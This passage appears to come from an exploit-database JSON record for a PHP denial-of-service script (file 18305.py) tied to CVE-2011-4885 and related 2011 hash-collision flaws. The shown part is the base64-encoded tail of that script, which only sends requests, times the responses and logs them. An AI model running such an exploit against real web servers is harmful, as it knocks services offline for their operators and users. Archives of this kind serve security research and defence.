ZWN2KDEwMjQpDQogICAgICAgICAgICAgICAgc3RyaW5nID0gIiINCiAgICAgICAgICAgICAgICB3aGlsZSBsZW4oZGF0YSk6DQogICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZyArIGRhdGENCiAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHNzbF9zb2NrLnJlY3YoMTAyNCkNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgZGF0YSA9IHNvY2sucmVjdigxMDI0KQ0KICAgICAgICAgICAgICAgIHN0cmluZyA9ICIiDQogICAgICAgICAgICAgICAgd2hpbGUgbGVuKGRhdGEpOg0KICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcgKyBkYXRhDQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSBzb2NrLnJlY3YoMTAyNCkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZWxhcHNlZCA9ICh0aW1lLnRpbWUoKSAtIHN0YXJ0KQ0KICAgICAgICAgICAgcHJpbnQoIlJlcXVlc3QgJXMgZmluaXNoZWQiICUgc3RyKGkrMSkpDQogICAgICAgICAgICBwcmludCgiUmVxdWVzdCAlcyBkdXJhdGlvbjogJXMiICUgKHN0cihpKzEpLCBlbGFwc2VkKSkNCiAgICAgICAgICAgIHNwbGl0ID0gc3RyaW5nLnBhcnRpdGlvbigiXHJcblxyXG4iKQ0KICAgICAgICAgICAgaGVhZGVyID0gc3BsaXRbMF0NCiAgICAgICAgICAgIGNvbnRlbnQgPSBzcGxpdFsyXQ0KICAgICAgICAgICAgaWYgb3B0aW9ucy52ZXJib3NlOg0KICAgICAgICAgICAgICAgICMgb25seSBwcmludCBodHRwIGhlYWRlcg0KICAgICAgICAgICAgICAgIHByaW50KCIiKQ0KICAgICAgICAgICAgICAgIHByaW50KGhlYWRlcikNCiAgICAgICAgICAgICAgICBwcmludCgiIikNCiAgICAgICAgICAgIGlmIG9wdGlvbnMub3V0cHV0Og0KICAgICAgICAgICAgICAgIGYgPSBvcGVuKG9wdGlvbnMub3V0cHV0K3N0cihpKSsiLmh0bWwiLCAidyIpDQogICAgICAgICAgICAgICAgZi53cml0ZSgiPCEtLSAiK2hlYWRlcisiIC0tPlxyXG4iK2NvbnRlbnQpDQogICAgICAgICAgICAgICAgZi5jbG9zZSgpDQoNCiAgICAgICAgaWYgdXJsLnNjaGVtZSA9PSAiaHR0cHMiOg0KICAgICAgICAgICAgc3NsX3NvY2suY2xvc2UoKQ0KICAgICAgICAgICAgc29jay5jbG9zZSgpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBzb2NrLmNsb3NlKCkNCg0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCiAgICBtYWluKCk=", 
    "filename": "platforms/php/dos/18305.py", 
    "id": "18305", 
    "cves": [
        "CVE-2011-5035", 
        "CVE-2011-5034", 
        "CVE-2011-4858", 
        "CVE-2011-4885"
    ]
}